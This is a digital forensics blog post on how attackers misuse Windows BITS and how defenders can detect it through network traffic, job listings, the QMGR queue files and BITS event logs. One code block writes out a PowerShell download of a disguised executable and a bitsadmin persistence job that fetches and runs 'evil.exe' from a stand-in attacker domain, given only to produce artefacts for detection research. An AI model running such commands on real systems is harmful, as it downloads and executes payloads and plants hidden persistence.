---
layout: post
title:  "Sharing my BITS"
date:   2018-02-18
categories: posts
tags: [DFIR,Powershell]
image: 00title.png
showTags: true
readTime: true
summary: I thought I would share some research on Microsoft BITS after a recent tool released by the French ANSSI to parse BITS job artefacts. This tool has sparked my interest due to previous research on download cradles and an interest in the client side forensics. I’m going to give a brief background, talk about some nuances in collection types and provide some background information when I was thinking about detection.
aliases: /posts/2018/02/18/Sharing_my_BITS.html
---

![](00title.png)

### What is BITS and why do we care?
Background Intelligent Transfer Service (BITS) is a Windows component used to transfer files asynchronously between a client and a server. Part of all modern Windows systems from 2000+, the most well known use for BITS is Windows updates and other Windows transfer tasks.

BITS has many interesting features including firewall whitelisted and proxy capable file transfer. BITS can also be configured on a schedule, with prioritisation or throttled transfer over idle network bandwidth. Additional "evil friendly" features are the ability to execute a command line option post job (persistence use case) and transfer policy. A newer feature is peer caching where subnet peer machines can be used as a cache for file downloads.

In short that means BITS fits the profile as a candidate for attackers "living off the land". Managed via a COM based API, Powershell or a built in binary (bitsadmin.exe), BITS can be used easily throughout the attack lifecycle.

For those interested in digging further, I have included some detailed links on capabilities and configuration in my references below.

### Artefact creation
Most of my testing has been working with BITS 5.5 in Windows 8.1, however the content below was tested on Windows 7 through 10.

```powershell
# Bits download initiated via Powershell
PS> Start-BitsTransfer -Source "http://www.totallylegitinappnews.com/mimi.jpg" -Destination "c:\Windows\vss\mimi.exe"

# Peristence via bitsadmin.exe
CMD> bitsadmin /create backdoor
CMD> bitsadmin /addfile backdoor "http://www.totallylegitinappnews.com/evil.exe"  "c:\windows\VSS\evil.exe"
CMD> bitsadmin /SetNotifyCmdLine backdoor c:\Windows\VSS\evil.exe NULL
CMD> bitsadmin /resume backdoor
```

I have shown some really simple examples above to generate artefacts, however in the wild there are also several attack tools that make building stealthy download cradles trivial. Please see references for more information.

### Collection - Network
Network is by far the easiest collection point via typical web traffic filtering on user agent string and whitelisted domains. Although I have found everything from Windows, to application, to news traffic, with most BITS traffic is fairly static over time. I have found interesting use cases baselining current activity then spotting deviations from normal focusing on content, http method, destination and URL.

![](01pcap.png)

Limitations in some environments are the obvious here: encrypted traffic. This method will also miss BITS setup with notification command line and not reaching out of the network.

### Collection - Endpoint
Endpoint is by far the most detailed collection point, but generally the most difficult to master. I have broken out the endpoint into various sections to provide insights. "Defending off the land", my goals are to find a lightweight collection capability to pull into a scripted solution without pre installation or change of audit policy. Unfortunately, that means probably the most valuable detection points: event monitoring via EDR, Sysmon and EventID 4688 (Process Creation + CLI) events are out, however some of the artefacts can be collected via EDR tools.

# Bits job configuration
BITS can be configured and jobs reviewed using either Powershell command-lets or bitsadmin.exe. Limitations on this type of collection are: unless collected during the transfer, only scheduled jobs are available.

![](02powershell.png)


In my testing, both methods provide similar granular information on job details, however Bitsadmin does provide additional context. In my example below you can see additional configuration of the notification command line feature, also bypassing Autoruns detection.

![](03powershell.png)


# QMGR database
Queue Manager queues store job specification and state. Typically located at: C:\ProgramData\Microsoft\Network\Downloader. For pre-Windows 10 systems, QMGR is stored in files named qmgr0.dat or qmgr1.dat.

Limitations are: Microsoft has migrated to ESE database format for Queue Manager in Windows 10 and beyond leaving with a solution that would only work on some current systems.

These are the files parsed by the ANSSI tool - bits_parser. Initially I toyed with the idea of a light weight binary parser in Powershell, to replicate bits_paser in non carving mode and roll in seperate capability for Windows 10.

![](04bitsparser.png)


Results worked but led me to the second limitation: visibility is focused on scheduled or recent jobs. Thats is great for the BITS persistence use case but single BITS tasks can rotate out of the Queue Manager quickly and may not be recoverable even with carving. Assuming available data, I also found carving in Powershell was too resource intensive for a light weight collection so the preferred method would be to collect and parse offline if carving is required.

Windows Event logs
Focusing on default event logs, the best source for detection of malicious download is the Microsoft-Windows-Bits-Client/Operational log. These logs hold: state, source, user and some file information for each BITS transfer. This event log also appears to be similar across Windows 7 through 10 so fits the profile and a good endpoint collection source.

![](05eventlogs.png)


Limitations include: sparse data, logs are spread over several EventIDs and potentially a lot of entries in a production environment making it difficult to spot evil hiding in the noise. This log will also not shed light on abuse of BITS for persistence unless there was a network transfer to a suspicious domain as part of the configured job.

Writing a script to pull all EventID 59 events, highlighting some of the available information from the event: Time (converted to UTC), JobName and Source URL we can see the kind of noise to expect in a few hours activity.

![Parsing eventlogs for detection](06bitsdetectall.png)
|:--:| 
| *Parsing eventlogs for detection* |


Following similar concepts to network based detection, I was able to build a whitelist for common domains from my network logs and whitelist out most of the noise potentially seen day to day.

![](07bitsdetect.png)

This method may be particularly helpful in environments that may have limitations on network encryption visibility. Some work is required to build out the whitelist with lots of outliers in a large network.

My content is [available here](https://github.com/mgreen27/Invoke-BitsParser). Some of the other features I have added are:

- Configuration of days back to search (default 14).
- A switch ("-All") to list all entries available in the logs to collect data to rejig whitelists from an endpoint view.


### Final Thoughts
I couldn't finish this post without talking a little about capabilities all organisations should aspire to. Gold standard should be a mix of network and endpoint based visibility, with the ability to cover all gaps from each single source.

Critical for a modern blue team, some of my recommendations are:

- Network based visibility around encrypted web traffic with content inspection.
- Process command line visibility on the endpoints to spot evil process chains and unusual command lines or obfuscation that is abnormal for the environment.
- Process module load visibility to spot unexpected functionality loaded.
- Process network activity to unexpected locations is also a good method to increase the scope of detection on the endpoint and provide additional context to network detections that may have visibility limitations.
- Spotting disk or registry write events out of normal activity and having context of associated process. Why is svchost.exe writing evil.exe to c:\Windows\VSS?
- Ability to execute adlib collections to answer questions of the environment.
- Upgrading to Powershell version 5 for Powershell script block visibility.

I hope this post has provided some good food for thought and pointed anyone interested in the direction for further research and reference material. Feel free to reach out if you have any questions.



## References
1. ANSSI. [Bits_Parser](https://github.com/ANSSI-FR/bits_parser)
2. Azouri, Dor. [BITSInject](https://media.defcon.org/DEF%20CON%2025/DEF%20CON%2025%20presentations/Dor%20Azouri/DEFCON-25-Dor-Azouri-BITSInject-WP.pdf)
3. Bohannon, Daniel. [Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)
4. Geiger,Matthew. [Finding Your Naughty BITS](https://www.dfrws.org/sites/default/files/session-files/pres-finding_your_naughty_bits.pdf)
5. Hexacorn. [Beyond Good Old RUn Key part 64](http://www.hexacorn.com/blog/2017/07/12/beyond-good-ol-run-key-part-64/)
6. Microsoft. [Bitsadmin documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753856(v=ws.11))
7. Microsoft. [Powershell Bitstransfer documentation](https://github.com/MicrosoftDocs/windows-powershell-docs/tree/master/docset/windows/bitstransfer)
8. Microsoft. [Using Windows Powershell to create BITS Jobs](https://msdn.microsoft.com/en-us/library/windows/desktop/ee663885(v=vs.85).aspx)
9. O'Day, Dan. [BITS annotationis](https://github.com/danzek/annotationis/blob/master/Operating%20Systems/Windows/BITS.md)
10. Secureworks, Counter Threat Unit. [Malware Lingers with BITS](https://www.secureworks.com/blog/malware-lingers-with-bits)